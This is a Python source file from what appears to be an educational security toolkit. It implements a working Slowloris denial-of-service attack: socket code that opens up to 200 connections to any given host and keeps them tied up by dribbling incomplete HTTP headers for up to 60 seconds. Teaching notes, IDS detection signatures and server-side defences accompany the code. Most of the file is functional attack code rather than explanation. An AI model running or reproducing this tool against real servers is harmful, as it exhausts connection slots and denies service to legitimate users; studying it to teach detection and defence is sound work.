"""
threatforge/core/dos_simulation/slowloris.py

Slowloris DoS Attack Simulation

SYLLABUS: Unit 11 - DoS and DDoS simulation
COVERAGE: CO4, CO5

THEORY:
Slowloris (invented by Robert "RSnake" Hansen, 2009) is elegant:
Instead of flooding with traffic, it HOLDS connections open slowly.

HOW IT WORKS:
1. Open many TCP connections to target
2. Send HTTP request headers very slowly (one per N seconds)
3. Never complete the request (never send the final empty line)
4. Server holds each connection open waiting for more data
5. Server runs out of connection slots
6. Legitimate users cannot connect

SIGNATURE:
GET / HTTP/1.1\r\n
Host: target\r\n
X-Custom-Header: aaaaaaa\r\n     ← keeps dribbling incomplete headers
(never sends final \r\n to complete request)

DETECTION SIGNATURES (for IDS):
- Many connections from same IP in CLOSE_WAIT or ESTABLISHED state
- Connections that send data very slowly
- Incomplete HTTP requests (no final CRLF CRLF)
- Connections held for unusually long time

WHY INTERESTING:
- Uses very low bandwidth (< 1KB/s per connection)
- Hard to distinguish from genuinely slow clients
- Effective against Apache, less effective against nginx
  (nginx handles many concurrent connections more efficiently)
"""

import socket
import time
import threading
import random
from typing import Dict, Any, List


class SlowlorisSocket:
    """A single Slowloris connection."""

    def __init__(self, host: str, port: int, timeout: float = 10.0):
        self.host = host
        self.port = port
        self.sock = None
        self.alive = False
        self.timeout = timeout

    def connect(self) -> bool:
        """Establish connection and send initial request."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))

            # Send initial GET request (incomplete)
            initial = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: Mozilla/5.0 (ThreatForge Educational)\r\n"
                f"Accept: text/html,application/xhtml+xml\r\n"
            )
            self.sock.send(initial.encode())
            self.alive = True
            return True
        except Exception:
            self.alive = False
            return False

    def send_keep_alive(self) -> bool:
        """
        Send a partial header to keep connection alive.

        This is the core of Slowloris:
        We send another header field without completing the request.
        Server keeps waiting for the request to finish.
        """
        if not self.sock or not self.alive:
            return False
        try:
            # Send another incomplete header (keeps connection alive)
            keep_alive = f"X-ThreatForge-{random.randint(1,9999)}: {'a' * random.randint(10,50)}\r\n"
            self.sock.send(keep_alive.encode())
            return True
        except Exception:
            self.alive = False
            return False

    def close(self):
        """Close connection."""
        self.alive = False
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass


class SlowlorisAttack:
    """
    Multi-connection Slowloris attack coordinator.

    Manages a pool of Slowloris connections, keeping them alive
    with periodic keep-alive header transmissions.
    """

    def __init__(
        self,
        target_host: str,
        target_port: int,
        max_connections: int = 100,
        keep_alive_interval: float = 10.0
    ):
        self.host = target_host
        self.port = target_port
        self.max_connections = min(max_connections, 200)  # Safety cap
        self.keep_alive_interval = keep_alive_interval
        self.connections: List[SlowlorisSocket] = []
        self.running = False
        self.stats = {
            "connections_attempted": 0,
            "connections_established": 0,
            "connections_dropped": 0,
            "keep_alives_sent": 0
        }

    def _establish_connection(self) -> bool:
        """Try to establish one new Slowloris connection."""
        self.stats["connections_attempted"] += 1
        conn = SlowlorisSocket(self.host, self.port)
        if conn.connect():
            self.connections.append(conn)
            self.stats["connections_established"] += 1
            return True
        return False

    def _send_keep_alives(self):
        """Send keep-alive to all active connections, remove dead ones."""
        dead = []
        for conn in self.connections:
            if not conn.send_keep_alive():
                dead.append(conn)
                self.stats["connections_dropped"] += 1
            else:
                self.stats["keep_alives_sent"] += 1

        for dead_conn in dead:
            dead_conn.close()
            self.connections.remove(dead_conn)

    def execute(self, duration_seconds: int = 30) -> Dict[str, Any]:
        """
        Execute Slowloris attack for specified duration.

        ALGORITHM:
        Phase 1 (first 10 seconds): Establish max_connections connections
        Phase 2 (remaining time):
            Every keep_alive_interval seconds:
                - Replace dropped connections
                - Send keep-alive to all active connections
        Phase 3: Close all connections, report

        Args:
            duration_seconds: Total attack duration (max 60s)

        Returns:
            Attack metrics
        """
        duration_seconds = min(duration_seconds, 60)
        start_time = time.perf_counter()
        end_time = start_time + duration_seconds

        # Phase 1: Establish connections
        for i in range(self.max_connections):
            if time.perf_counter() >= end_time:
                break
            self._establish_connection()
            time.sleep(0.05)  # Small delay between connections

        peak_connections = len(self.connections)

        # Phase 2: Maintain connections with keep-alives
        while time.perf_counter() < end_time:
            self._send_keep_alives()

            # Replace dropped connections
            dropped = self.max_connections - len(self.connections)
            for _ in range(min(dropped, 10)):  # Replace up to 10 at a time
                if time.perf_counter() >= end_time:
                    break
                self._establish_connection()

            # Wait before next keep-alive round
            time.sleep(self.keep_alive_interval)

        # Phase 3: Cleanup
        for conn in self.connections:
            conn.close()
        self.connections.clear()

        total_duration = time.perf_counter() - start_time

        return {
            "attack_type": "slowloris",
            "target": f"{self.host}:{self.port}",
            "max_connections_configured": self.max_connections,
            "peak_connections_established": peak_connections,
            "keep_alive_interval_seconds": self.keep_alive_interval,
            "duration_seconds": round(total_duration, 2),
            "stats": self.stats,
            "bandwidth_used_kb": round(
                (self.stats["keep_alives_sent"] * 50 +
                 self.stats["connections_established"] * 200) / 1024, 2
            ),
            "detection_signatures": [
                f"Many connections from same IP in ESTABLISHED state",
                "Connections sending data very slowly (< 100 bytes/s)",
                "Incomplete HTTP requests (no final CRLF CRLF)",
                f"Connections held open for >{self.keep_alive_interval}s with no request completion"
            ],
            "defense_note": (
                "Apache fix: mod_reqtimeout (RequestReadTimeout header 20-40)\n"
                "nginx: worker_connections and keepalive_timeout settings\n"
                "iptables: connlimit module to limit connections per IP"
            )
        }


async def run_slowloris(
    target_host: str,
    target_port: int = 80,
    max_connections: int = 50,
    duration_seconds: int = 30
) -> Dict[str, Any]:
    """
    Async wrapper for Slowloris attack.

    Args:
        target_host: Target IP
        target_port: Target port (default 80)
        max_connections: Max simultaneous connections (max 200)
        duration_seconds: Duration (max 60s)

    Returns:
        Attack metrics
    """
    attack = SlowlorisAttack(
        target_host, target_port,
        min(max_connections, 200),
        keep_alive_interval=10.0
    )

    import asyncio
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, attack.execute, duration_seconds)
    return result
